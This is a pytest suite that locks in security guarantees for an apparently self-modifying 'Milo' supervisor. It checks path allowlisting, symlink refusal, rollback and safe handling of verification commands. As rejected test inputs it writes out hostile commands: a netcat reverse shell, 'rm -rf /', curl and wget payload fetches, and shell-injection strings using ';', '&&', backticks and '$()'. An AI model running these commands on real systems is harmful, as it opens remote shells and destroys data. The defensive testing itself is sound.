"""Security regression tests for the Milo Evolution supervisor.

These lock in the allowlist guarantees introduced by the execution lockdown:
writes must stay inside ~/.local/bin or ~/.local/share/milo, symlinks are
refused, verification commands are never handed to a shell, and a hostile
proposal is rejected *before* anything is written to disk.
"""

import json
import os
import threading
from pathlib import Path

import pytest

import supervisor


def _proposal(path, content="", verify="true", executable=False, pid="test-proposal"):
    return {
        "id": pid,
        "title": "unit-test proposal",
        "actions": [
            {
                "action": "create_script",
                "path": str(path),
                "content": content,
                "executable": executable,
            }
        ],
        "verification_command": verify,
    }


@pytest.fixture
def sup(tmp_path, monkeypatch):
    """A supervisor wired to a throwaway HOME so nothing real is touched."""
    fake_home = tmp_path / "home"
    bin_dir = fake_home / ".local" / "bin"
    bin_dir.mkdir(parents=True)
    (fake_home / ".local" / "share" / "milo").mkdir(parents=True)

    evolution_dir = fake_home / ".local" / "share" / "milo" / "evolution"
    monkeypatch.setattr(supervisor, "EVOLUTION_DIR", evolution_dir)
    monkeypatch.setattr(supervisor, "PROPOSALS_DIR", evolution_dir / "proposals")
    monkeypatch.setattr(supervisor, "LEDGER_FILE", evolution_dir / "evolution_ledger.json")
    monkeypatch.setattr(
        supervisor, "OBSIDIAN_REFLECTIONS", fake_home / "MiloNotes" / "Daily"
    )
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake_home))

    instance = supervisor.MiloSupervisor()
    # Never touch the desktop or the voice daemon from a test run.
    monkeypatch.setattr(instance, "hud_say", lambda *a, **k: None)
    monkeypatch.setattr(instance, "speak", lambda *a, **k: None)

    return instance, fake_home


# --------------------------------------------------------------------------
# Path containment
# --------------------------------------------------------------------------


def test_accepts_target_inside_local_bin(sup):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-ok.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\nexit 0\n", executable=True)
    ) is True

    assert target.is_file()
    assert target.read_text() == "#!/bin/bash\nexit 0\n"
    assert target.stat().st_mode & 0o777 == 0o755


def test_accepts_target_inside_local_share_milo(sup):
    instance, fake_home = sup
    target = fake_home / ".local" / "share" / "milo" / "data.json"

    assert instance.apply_proposal(_proposal(target, '{"ok": true}')) is True
    assert json.loads(target.read_text()) == {"ok": True}


def test_rejects_target_outside_allowlist(sup, tmp_path):
    instance, _ = sup
    target = tmp_path / "evil.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\ntouch /tmp/pwned\n", executable=True)
    ) is False
    assert not target.exists()


def test_rejects_symlinked_target_file(sup, tmp_path):
    instance, fake_home = sup
    outside = tmp_path / "outside.sh"
    outside.write_text("original\n")

    link = fake_home / ".local" / "bin" / "linked.sh"
    link.symlink_to(outside)

    assert instance.apply_proposal(_proposal(link, "#!/bin/bash\necho owned\n")) is False

    assert link.is_symlink()
    assert outside.read_text() == "original\n"


def test_rejects_symlink_even_inside_allowlist(sup):
    """A symlink whose target is also inside the allowlist must still be refused.

    Path containment alone would permit this write; only the explicit
    is_symlink() guard prevents the indirection.
    """
    instance, fake_home = sup
    real = fake_home / ".local" / "bin" / "milo-real.sh"
    real.write_text("#!/bin/bash\necho real\n")

    link = fake_home / ".local" / "bin" / "milo-alias.sh"
    link.symlink_to(real)

    assert instance.apply_proposal(
        _proposal(link, "#!/bin/bash\necho hijacked\n")
    ) is False

    assert real.read_text() == "#!/bin/bash\necho real\n"
    assert link.is_symlink()


def test_rejects_symlinked_parent_directory(sup, tmp_path):
    instance, fake_home = sup
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()

    link_dir = fake_home / ".local" / "bin" / "linkdir"
    link_dir.symlink_to(elsewhere, target_is_directory=True)

    target = link_dir / "evil.sh"
    assert instance.apply_proposal(_proposal(target, "#!/bin/bash\nexit 0\n")) is False
    assert not (elsewhere / "evil.sh").exists()


# --------------------------------------------------------------------------
# Verification command allowlist
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "verify",
    [
        "curl http://example.com/payload",
        "rm -rf /",
        "echo pwned",
        "/usr/bin/wget http://example.com",
        "nc -e /bin/sh 10.0.0.1 4444",
        "python",  # not on the allowlist (only python3 is)
    ],
)
def test_rejects_non_allowlisted_verification_binary(sup, verify):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-verify.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\nexit 0\n", verify=verify)
    ) is False
    assert not target.exists()


@pytest.mark.parametrize(
    "verify",
    [
        "true; touch /tmp/milo_pwned",
        "true && touch /tmp/milo_pwned",
        "true | tee /tmp/milo_pwned",
        "true `touch /tmp/milo_pwned`",
        "true $(touch /tmp/milo_pwned)",
        "true > /tmp/milo_pwned",
        "true\n touch /tmp/milo_pwned",
    ],
)
def test_rejects_shell_metacharacters(sup, verify):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-meta.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\nexit 0\n", verify=verify)
    ) is False
    assert not target.exists()
    assert not Path("/tmp/milo_pwned").exists()


@pytest.mark.parametrize("verify", ["", "   ", None])
def test_rejects_empty_verification(sup, verify):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-empty.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\nexit 0\n", verify=verify)
    ) is False
    assert not target.exists()


@pytest.mark.parametrize("verify", ["true", "test -d /", "bash -n /dev/null"])
def test_accepts_allowlisted_verification(sup, verify):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-good.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\nexit 0\n", verify=verify)
    ) is True
    assert target.is_file()


def test_verification_is_validated_before_any_write(sup, tmp_path):
    """A rejected verification command must not leave a written file behind."""
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-order.sh"

    assert instance.apply_proposal(
        _proposal(target, "#!/bin/bash\nexit 0\n", verify="echo nope")
    ) is False

    assert not target.exists()
    assert not list(target.parent.glob("*.evo_tmp"))


# --------------------------------------------------------------------------
# Pre-flight syntax checks and rollback
# --------------------------------------------------------------------------


def test_rejects_python_with_syntax_error(sup):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo_broken.py"

    assert instance.apply_proposal(_proposal(target, "def broken(\n")) is False
    assert not target.exists()


def test_rejects_shell_with_syntax_error(sup):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo_broken.sh"

    assert instance.apply_proposal(_proposal(target, "#!/bin/bash\nif [ ; then\n")) is False
    assert not target.exists()


def test_failed_verification_restores_previous_content(sup):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-existing.sh"
    target.write_text("#!/bin/bash\necho original\n")

    proposal = _proposal(
        target,
        "#!/bin/bash\necho replaced\n",
        verify="test -f /definitely/not/a/real/path",
    )
    assert instance.apply_proposal(proposal) is False

    assert target.read_text() == "#!/bin/bash\necho original\n"
    assert not list(target.parent.glob("*.bak_evo.*"))


def test_failed_verification_removes_newly_created_file(sup):
    instance, fake_home = sup
    target = fake_home / ".local" / "bin" / "milo-created.sh"

    proposal = _proposal(
        target, "#!/bin/bash\nexit 0\n", verify="test -f /definitely/not/a/real/path"
    )
    assert instance.apply_proposal(proposal) is False
    assert not target.exists()


# --------------------------------------------------------------------------
# Ledger atomicity
# --------------------------------------------------------------------------


def test_ensure_ledger_creates_valid_json(sup):
    instance, _ = sup
    data = json.loads(supervisor.LEDGER_FILE.read_text())
    assert data == {"evolutions": []}


def test_record_success_is_locked_and_atomic(sup):
    """Concurrent writers must not lose entries or corrupt the ledger."""
    instance, _ = sup
    total = 24

    def worker(index):
        instance.record_success({"id": f"evo-{index}", "title": f"Evolution {index}"})

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(total)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    data = json.loads(supervisor.LEDGER_FILE.read_text())
    ids = {entry["id"] for entry in data["evolutions"]}

    assert len(data["evolutions"]) == total
    assert ids == {f"evo-{i}" for i in range(total)}


def test_ledger_file_has_owner_only_permissions(sup):
    instance, _ = sup
    instance.record_success({"id": "perm", "title": "Permissions"})
    mode = supervisor.LEDGER_FILE.stat().st_mode & 0o777
    # mkstemp creates 0600; os.replace preserves it.
    assert mode == 0o600
